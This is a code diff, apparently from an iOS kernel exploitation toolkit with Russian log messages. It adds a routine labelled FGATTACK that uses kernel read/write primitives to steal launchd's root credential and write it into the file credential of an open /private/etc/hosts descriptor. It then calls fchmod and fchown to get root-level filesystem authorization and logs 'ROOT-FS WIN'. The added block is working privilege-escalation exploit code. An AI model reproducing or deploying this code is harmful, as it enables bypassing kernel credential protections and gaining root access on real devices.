@@ -2469,7 +2469,58 @@ static NSString *kpFmtSptmFn(uint64_t raw)
                       (unsigned long long)kp_untag_ptr(rbDry)]);
             [r appendString:@"FAIL: heap-only swap через kwrite нежизнеспособен на 18.6 — proc_ro RO-зона.\n"];
             [r appendString:@"Используй авто-цепь PHYSWRITE: INPL (in-place ucred) или PSWAP-B (DMA в поле p_ucred).\n"];
+            // kexproofv2 2.0.39 [FGATTACK] — f_cred swap, kwrite-only, no DART.
+            // fchmod/fchown authorize via the FILE's f_cred, not proc-cred:
+            // swap fg_cred of our fd to root cred -> authorization passes.
+            {
+                uint64_t ldProc = [self findProcByPid:1 log:nil];
+                uint64_t rootZVA = 0;
+                if (kpLooksLikeKernelPointer(ldProc)) {
+                    uint64_t ldRo = kp_untag_ptr(early_kread64(ldProc + koffsetof(proc, proc_ro)));
+                    uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
+                    uint32_t ldUid = ldUc ? (uint32_t)early_kread64(ldUc + 0x18) : 0xffff;
+                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] launchd ucred=%#llx uid=%u", (unsigned long long)ldUc, ldUid]);
+                    if (ldUid == 0 && kpLooksLikeKernelPointer(ldUc)) rootZVA = ldUc;
+                }
+                int tfd = open("/private/etc/hosts", O_RDONLY);
+                kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] rootZVA=%#llx hosts fd=%d", (unsigned long long)rootZVA, tfd]);
+                uint64_t fpRaw = 0, globRaw = 0, fdOf = 0;
+                if (tfd >= 0 && rootZVA && selfProc) {
+                    early_kread(selfProc + 0xF8, &fdOf, 8, "fd_ofiles");
+                    uint64_t ofiles = kp_untag_ptr(fdOf);
+                    if (kpLooksLikeKernelPointer(ofiles))
+                        early_kread(ofiles + (uint64_t)tfd * 8, &fpRaw, 8, "ofiles[fd]");
+                    uint64_t fp = kp_untag_ptr(fpRaw);
+                    if (kpLooksLikeKernelPointer(fp))
+                        early_kread(fp + off_fileproc_fp_glob, &globRaw, 8, "fileproc.glob");
+                    uint64_t glob = kp_untag_ptr(globRaw);
+                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileproc=%#llx fileglob=%#llx", (unsigned long long)fp, (unsigned long long)glob]);
+                    uint32_t fgOff = 0xFFFFFFFF;
+                    if (kpLooksLikeKernelPointer(glob)) {
+                        for (uint32_t o = 0; o + 8 <= 0x200; o += 8)
+                            if (early_kread64(glob + o) == curUcred) { fgOff = o; break; }
+                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred offset=%@",
+                                  fgOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", fgOff] : @"not found"]);
+                    }
+                    if (fgOff != 0xFFFFFFFF) {
+                        uint64_t old = early_kread64(glob + fgOff);
+                        early_kwrite64(glob + fgOff, rootZVA);
+                        uint64_t rb = early_kread64(glob + fgOff);
+                        int ch = fchmod(tfd, 0644);
+                        int ch2 = fchown(tfd, 0, 0);
+                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred->root: readback=%#llx fchmod=%d fchown=%d errno=%d — %@",
+                                  (unsigned long long)rb, ch, ch2, errno,
+                                  (rb == rootZVA && (ch == 0 || ch2 == 0)) ? @"ROOT-FS WIN" : @"miss"]);
+                        if (ch == 0 || ch2 == 0) {
+                            kpNote(r, @"=== ROOT (filesystem) WIN: f_cred authorization passes as root ===");
+                        }
+                        early_kwrite64(glob + fgOff, old);
+                    }
+                }
+                if (tfd >= 0) close(tfd);
+            }
             return r;
+
         }
     }
 
